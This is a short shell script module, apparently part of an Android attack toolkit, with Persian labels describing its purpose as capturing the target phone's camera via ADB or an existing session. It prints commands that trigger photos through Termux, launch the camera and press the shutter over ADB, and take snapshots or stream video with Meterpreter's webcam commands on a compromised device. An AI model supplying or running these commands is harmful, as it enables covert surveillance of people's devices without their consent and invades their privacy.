DESC="دوربین گوشی هدف"
REQ="ADB یا session"
RISK="LOW"

termux(){ echo "termux-camera-photo -c 0 /sdcard/x.jpg"; }

kali(){
cat <<'EOF'
# روش ADB:
adb shell am start -a android.media.action.STILL_IMAGE_CAMERA
sleep 3 && adb shell input keyevent KEYCODE_CAMERA
# روش meterpreter:
webcam_snap -i 1
webcam_stream -i 1
EOF
}
